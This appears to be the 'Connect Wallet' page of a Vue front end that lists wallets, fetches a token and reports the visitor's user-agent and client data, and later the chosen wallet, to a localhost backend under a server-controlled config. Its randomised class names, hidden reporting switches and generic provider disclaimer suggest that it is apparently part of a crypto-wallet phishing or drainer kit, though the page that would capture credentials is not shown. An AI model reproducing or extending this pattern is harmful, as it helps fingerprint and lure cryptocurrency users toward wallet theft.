<script setup lang="js">
import Wallet from "../components/Wallet.vue";
import { ref, onMounted } from "vue";
import { useUserStore } from "../stores/Store";
import { useRouter } from "vue-router";
import axios from "axios";

const router = useRouter()

const wallets = ref([]);

const store = useUserStore()

//получаем токен. сделано, чтобы избежать возможных запросов из вне
const getToken = async () => {
  const data = {
    date: new Date(),
  }
  const response = await axios.post('http://localhost:3000/get-token', data, {
    headers:
      {
        'Content-Type': 'application/json',
      }
  })
  store.token = response.data.token
}

//получаем массив кошельков
const getWallets = async () => {
  const response = await axios.get('http://localhost:3000/wallets', {
    headers:
      {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${store.token}`
      }
  })
  wallets.value = response.data.wallets
  renderWallets.value = wallets.value.slice(0,4)
  store.userData = {
    ua: response.data.user.result,
    client: response.data.user.clientData
  }
  store.requestConfig = response.data.requestConfig
}

const getUserInfo = async () => {
  await axios.post('http://localhost:3000/user',{
    userData: store.userData
  }, {
    headers:
      {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${store.token}`
      }
  })
}

const selectedWallet = async () => {
  await axios.post('http://localhost:3000/chosenwallet', {
    wallet: store.selectedWallet.name,
    userData: store.userData
  },{
    headers:
      {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${store.token}`
      }
  })
}

//массив, который используется для рендера
const renderWallets = ref([]);

//по загрузке страницы выполняем функции
onMounted(async () => {
  await getToken()
  await getWallets()
  if (store.requestConfig.enter) {
    getUserInfo()
  }
})

//функция выбора кошелька
const selectWalletFucntion = (wallet) => {
  store.selectedWallet = wallet
  if (store.requestConfig.choosewallet) {
    selectedWallet()
  }
  router.push({ name: 'connect' })
}

//функция отображения остальных кошельков
const handleClick = () => {
  renderWallets.value = wallets.value
}
</script>

<template>
  <div class="jd92JkalO-container">
    <div class="vNm72810O-container">
      <div class="a92838Lb9-container">
        <h1 style="font-size: 1.25em; font-weight: 800; line-height: 1.75em">
          Connect Wallet
        </h1>
      </div>
      <div class="p8d9IoRi-container x2kdAsd82-scrollbar">
        <Wallet
          @selectWallet="selectWalletFucntion"
          v-for="wallet in renderWallets"
          :key="wallet.name"
          :wallet="wallet"
        />
      </div>
      <button
        v-if="renderWallets.length < 5"
        @click="handleClick"
        class="zc2Y4bn9f-container"
      >
        Others
      </button>
      <div style="margin-top: 1.25em; font-size: 1.125em; text-align: center">
        <p>
          Need help with connecting a wallet? <br />
          <span style="text-decoration: underline; cursor: pointer"
            >Read our FAQ</span
          >
        </p>
        <p
          style="
            margin-top: 1.25em;
            font-size: 0.75em;
            line-height: 1em;
            max-width: 450px;
          "
        >
          Wallets are provided by External Provider and by selecting you agreed
          to Terms of those Providers. Your access to the wallet might be
          reliant on the External Provider being operational.
        </p>
      </div>
    </div>
  </div>
</template>

<style scoped>
.zc2Y4bn9f-container {
  margin-top: 0.5em;
  background-color: #2092ff;
  color: #001b4e;
  border-radius: 0.75em;
  padding-left: 0.5em;
  padding-right: 0.5em;
  padding-top: 0.25em;
  padding-bottom: 0.25em;
  font-size: 1.25em;
  width: 100%;
  line-height: 1.75em;
  transition-property: all;
  transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
  transition-duration: 150ms;
}

.zc2Y4bn9f-container:active {
  scale: 0.98;
}
.p8d9IoRi-container {
  margin-top: 1em;
  width: 100%;
  display: flex;
  flex-direction: column;
  gap: 2px;
  max-height: 250px;
  overflow-y: auto;
}
.a92838Lb9-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
  width: 100%;
  flex-direction: row;
}
.vNm72810O-container {
  height: 100%;
  width: 100%;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  padding: 0.5em;
}
.jd92JkalO-container {
  max-height: fit-content;
  max-width: 390px;
  background-color: #232323;
  padding: 0.5em;
}
.background-main {
  background-color: rgba(0, 0, 0, 0.25);
}
.x2kdAsd82-scrollbar {
  padding-right: 4px;
}
.x2kdAsd82-scrollbar::-webkit-scrollbar {
  width: 4px;
}

.x2kdAsd82-scrollbar::-webkit-scrollbar-thumb {
  background-color: #ffffffcc;
  border-radius: 999px;
  border: 1px solid #00000000;
}

.x2kdAsd82-scrollbar::-webkit-scrollbar-track {
  background-color: #00000000;
  border-radius: 999px;
  border: 1px solid #00000000;
}
</style>
